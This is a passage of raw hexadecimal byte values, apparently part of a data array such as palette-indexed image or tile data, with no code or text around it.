0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1C, 0x1C, 0x1B, 0x1B, 0x07, 0x1B, 0x1B, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D,
0x1D, 0x1C, 0x1C, 0x1C, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1D, 0x1C, 0x1C, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1C,
0x1C, 0x1B, 0x1B, 0x1C, 0x1C, 0x1D, 0x1E, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1E, 0x1E, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x19, 0x19, 0x19,
0x07, 0x07, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9D, 0x9C, 0x17, 0x17, 0x9C, 0x9C, 0x9C, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9D, 0x9C, 0x17, 0x16, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D,
0x9E, 0x9E, 0x9E, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9E,
0x08, 0x08, 0x9E, 0x9C, 0x17, 0x17, 0x9C, 0x17, 0x9C, 0x9D, 0x9D, 0x9D, 0x9D, 0x9C, 0x9C, 0x9C,
0x17, 0x17, 0x9C, 0x9D, 0x9D, 0x9D, 0x9D, 0x9E, 0x9E, 0x9E, 0x86, 0x86, 0x87, 0xE4, 0x87, 0x86,
0x85, 0x9D, 0x9C, 0x9C, 0x9C, 0x9D, 0x86, 0xCD, 0xCE, 0xCE, 0xCD, 0x87, 0xCC, 0xCD, 0xCC, 0x86,
0x9C, 0x18, 0x19, 0x18, 0x18, 0x18, 0x18, 0x18, 0x19, 0x19, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x07, 0x19, 0x19, 0x19, 0x19, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C,
0x1C, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B,
0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1D, 0x1E, 0x1E, 0x1D,
0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x07, 0x07, 0x19, 0x19, 0x19, 0x19, 0x07, 0x07, 0x07, 0x19, 0x19, 0x19, 0x07,
0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19,
0x19, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18,
0x18, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x9C, 0x9D, 0x9C, 0x17, 0x17, 0x18, 0x18, 0x18, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x17,
0x9D, 0x9D, 0x9C, 0x9C, 0x9D, 0x9D, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x9C, 0x9D, 0x9D, 0x9D, 0x9D,
0x9D, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9D,
0x9D, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9D, 0x9D, 0x9E, 0x85, 0x85, 0x9E, 0x9D, 0x9D, 0x9C,
0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9E, 0x87, 0xE4, 0xE4, 0x87, 0x87, 0x86, 0x87, 0xCD, 0xCE, 0xCD,
0x86, 0x9C, 0x18, 0x19, 0x18, 0x18, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18, 0x18,
0x18, 0x19, 0x19, 0x19, 0x19, 0x07, 0x07, 0x07, 0x07, 0x19, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1C, 0x1C,
0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1D, 0x1E, 0x1E, 0x1E,
0x1E, 0x1D, 0x1C, 0x1B, 0x1C, 0x1C, 0x1D, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1C, 0x1C, 0x07, 0x07, 0x19, 0x19, 0x19, 0x07, 0x07, 0x07, 0x19, 0x19, 0x19, 0x19, 0x19,
0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18,
0x18, 0x18, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9D, 0x9D, 0x9C, 0x17,
0x17, 0x17, 0x17, 0x9D, 0x9D, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9D, 0x9E, 0x9D, 0x9D, 0x9D, 0x9C, 0x9C, 0x9C, 0x9C,
0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9D, 0x9D, 0x9E, 0x86, 0x87, 0xCD, 0xCE, 0xCF, 0xCD,
0xCC, 0x86, 0x9C, 0x19, 0x19, 0x18, 0x19, 0x19, 0x18, 0x18, 0x19, 0x19, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x1B, 0x1B, 0x07, 0x07, 0x18, 0x18, 0x19, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C,
0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E,
0x1E, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x0F,
0x1E, 0x1E, 0x1D, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D,
0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1C, 0x1C, 0x1C, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19,
0x19, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x17, 0x18, 0x18, 0x17, 0x17,
0x17, 0x17, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x17, 0x17, 0x17, 0x18, 0x18,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x9D, 0x9D, 0x17, 0x17, 0x17, 0x17, 0x18, 0x18, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x9C, 0x9C, 0x9D, 0x9D, 0x9D, 0x9D, 0x9C, 0x9D, 0x9D, 0x9E, 0x9D, 0x9C, 0x9C, 0x17, 0x17,
0x18, 0x18, 0x19, 0x18, 0x18, 0x17, 0x18, 0x18, 0x18, 0x17, 0x9C, 0x9E, 0x86, 0xE4, 0xCE, 0xCE,
0xCD, 0x87, 0x86, 0x9C, 0x18, 0x18, 0x18, 0x19, 0x07, 0x07, 0x07, 0x19, 0x19, 0x19, 0x07, 0x07,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x18, 0x17, 0x9C, 0x17, 0x17, 0x07, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x07, 0x07, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1D,
0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x0F,
0x1E, 0x1E, 0x1D, 0x1C, 0x1C, 0x1B, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1B, 0x1B, 0x1B,
0x1B, 0x1C, 0x1D, 0x1C, 0x1B, 0x1D, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C,
0x1C, 0x1C, 0x1C, 0x07, 0x07, 0x19, 0x19, 0x07, 0x07, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19,
0x19, 0x19, 0x18, 0x18, 0x18, 0x19, 0x19, 0x18, 0x17, 0x17, 0x9D, 0x9E, 0x9D, 0x9C, 0x17, 0x17,
0x18, 0x18, 0x18, 0x19, 0x18, 0x18, 0x18, 0x18, 0x17, 0x17, 0x17, 0x18, 0x18, 0x18, 0x18, 0x18,
0x18, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x18, 0x18, 0x17,
0x9E, 0x14, 0xE4, 0x08, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9D, 0x9F, 0x86, 0xE4,
0xE4, 0x86, 0x86, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9D, 0x9D, 0x9C, 0x9C, 0x18, 0x18, 0x19, 0x18,
0x18, 0x18, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18, 0x18, 0x18, 0x17, 0x9D, 0x86, 0xCC,
0xCD, 0xCD, 0xE4, 0x9F, 0x18, 0x19, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x1B, 0x07, 0x07, 0x07, 0x07, 0x19, 0x18, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x07, 0x07, 0x1B, 0x1B, 0x1C,
0x1C, 0x1C, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1D, 0x1D, 0x1D, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1D, 0x1C,
0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x07, 0x07, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B,
0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1E, 0x1E,
0x1E, 0x1E, 0x1E, 0x1D, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C,
0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x07, 0x07, 0x07, 0x07, 0x07, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19,
0x19, 0x19, 0x18, 0x18, 0x17, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x17, 0x17, 0x17, 0x18,
0x18, 0x18, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x17,
0x17, 0x18, 0x18, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x18, 0x18, 0x18, 0x18, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x18, 0x18, 0x18,
0x18, 0x17, 0x17, 0x17, 0x18, 0x18, 0x18, 0x18, 0x17, 0x9C, 0x08, 0xE4, 0xCD, 0xCE, 0xCD, 0xE4,
0xE4, 0x86, 0x9E, 0x9D, 0x9C, 0x9C, 0x17, 0x18, 0x18, 0x18, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19,
0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x07, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18, 0x9C, 0x85,
0xE4, 0xCD, 0xCE, 0xCE, 0xE4, 0x9E, 0x18, 0x19, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x07, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B,
0x1B, 0x1C, 0x1C, 0x1C, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1C, 0x1C, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1D, 0x1D,
0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C,
0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E,
0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C,
0x1C, 0x1B, 0x1B, 0x07, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18, 0x17, 0x17, 0x17, 0x18,
0x18, 0x19, 0x19, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x17,
0x17, 0x17, 0x18, 0x17, 0x17, 0x17, 0x17, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x9C, 0x9E, 0x08, 0x14, 0x14, 0x08, 0x08, 0x08, 0x08,
0x9F, 0x9D, 0x17, 0x18, 0x18, 0x18, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19,
0x19, 0x19, 0x19, 0x19, 0x19, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x19, 0x19, 0x18, 0x17,
0x9E, 0x86, 0xE4, 0xE5, 0xE5, 0xE5, 0x9F, 0x18, 0x07, 0x1B, 0x07, 0x07, 0x19, 0x07, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x07, 0x07, 0x07, 0x1B, 0x07, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1C,
0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1E, 0x1E, 0x0F, 0x1E, 0x1D, 0x1C, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1C, 0x1C, 0x07, 0x07, 0x07, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18, 0x18, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x17, 0x16, 0x9D, 0x16, 0x16, 0x16, 0x17, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17,
0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x18, 0x18, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18,
0x18, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19,
0x19, 0x19, 0x19, 0x19, 0x19, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x19, 0x19, 0x18, 0x18,
0x17, 0x9D, 0x9E, 0x9F, 0x9E, 0x9D, 0x9C, 0x17, 0x19, 0x07, 0x07, 0x19, 0x18, 0x17, 0x18, 0x19,
0x07, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C,
0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D,
0x1D, 0x1C, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C,
0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
